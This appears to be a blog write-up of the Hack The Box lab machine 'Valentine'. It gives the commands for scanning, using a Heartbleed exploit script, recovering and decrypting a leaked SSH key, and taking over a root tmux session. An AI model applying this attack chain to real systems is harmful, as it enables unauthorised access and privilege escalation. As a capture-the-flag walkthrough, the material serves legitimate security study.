---
layout: post
title: Hack The Box - Valentine Writeup
date: 2024-06-25 02:00:00 +0100
published: true
categories: [Hack The Box]
tags: [Hack The Box]
---

![valentineBadge.png](/assets/img/Valentine/valentineBadge.png)

## Summary

 `Nmap` revealed that server is vulnerable to `Heartbleed`. Exploiting this I was able to retrieve memory leak which contained base64 encoded string that decodes to `heartbleedbelievethehype`. 
By brute forcing directories on port 80 I was able to find `/dev/` directory which contains `hype_key`. By inspecting contents of `hype_key`, I was able to determine that it is hex encoded. To decode it I used `xxd`. Decoded file proved to be encrypted `rsa` key. After decrypting file with `openssl` I was able to `ssh` into the box as user `hype`. Enumerating system with `linpeas.sh` revealed that root is running `/usr/bin/tmux -S /.devs/dev_sess` command. To get access to this root session we can replicate same command. 


## Reconnaissance

### Nmap

```
nmap -sV -sC -p- -oN ./nmapAll.txt --max-retries=1 10.10.10.79
```

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 964c51423cba2249204d3eec90ccfd0e (DSA)
|   2048 46bf1fcc924f1da042b3d216a8583133 (RSA)
|_  256 e62b2519cb7e54cb0ab9ac1698c67da9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.22 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
|_ssl-date: 2024-06-25T00:39:21+00:00; -1s from scanner time.
|_http-server-header: Apache/2.2.22 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
nmap --script vuln 10.10.10.79
```

![nmapVuln.png](/assets/img/Valentine/nmapVuln.png)

## Enumeration

### Service Enumeration

| **IP Address** | **Ports Open** |
|-------|--------|
| 10.10.11.180 | **TCP**: 22, 80, 443 |

#### Port 80/443

##### Heartbleed Bug
 
 `Nmap` revealed that server is vulnerable to [Heartbleed](https://heartbleed.com/). For exploitation I used this python [script](https://gist.github.com/eelsivart/10174134) which leaked part of memory which contains `$text` variable. 

```
python2 heartbleed.py 10.10.10.79 -p 443
```

![exploit.png](/assets/img/Valentine/exploit.png)

String looks like base64 and after decoding it we get `heartbleedbelievethehype`.

![decode.png](/assets/img/Valentine/decode.png)

##### Website

![80-443.png](/assets/img/Valentine/80-443.png)

##### Dirsearch

```
dirsearch -e php,asp,aspx,jsp,py,txt,conf,config,bak,backup,swp,old,db,sql -u http://valentine.htb
```

![dirsearch.png](/assets/img/Valentine/dirsearch.png)

##### Directory /dev

`/dev` directory contains interesting `hype_key` file. The name of the file suggests that it is some sort of key. 

![dev.png](/assets/img/Valentine/dev.png)

By inspecting contents of `hype_key`, we can see that it is hex encoded. To decode it I used `xxd`.

```
cat hype_key | xxd -r -p > id_rsa_enc
```

![sshEnc.png](/assets/img/Valentine/sshEnc.png)

Inspecting decoded file reveals that key is encrypted. We can use `openssl` for decryption. For pass phrase I used `heartbleedbelievethehype`. 

```
openssl rsa -in id_rsa_enc -out id_rsa
```

![rsaDecrypt.png](/assets/img/Valentine/rsaDecrypt.png)


## Initial Foothold

### SSH - hype

With decrypted `rsa` key I was able to `ssh` into the box as user `hype`.

```
ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -i id_rsa hype@10.10.10.79
```

![ssh.png](/assets/img/Valentine/ssh.png)

### User.txt

![userFlag.png](/assets/img/Valentine/userFlag.png)


## Privilege Escalation

### System Enumeration

#### Linpeas

Running `linpeas.sh` revealed that `root` is running `/usr/bin/tmux -S /.devs/dev_sess` command. 
 
![linpeas.png](/assets/img/Valentine/linpeas.png)

To access this `tmux` session we can use same command. 

```
/usr/bin/tmux -S /.devs/dev_sess 
```

Running this command resulted in error: `open terminal failed: missing or unsuitable terminal: tmux-256color`, which can be fixed by this command:

```
export TERM=xterm
```

After that we are able to connect to `root` session.

![root.png](/assets/img/Valentine/root.png)


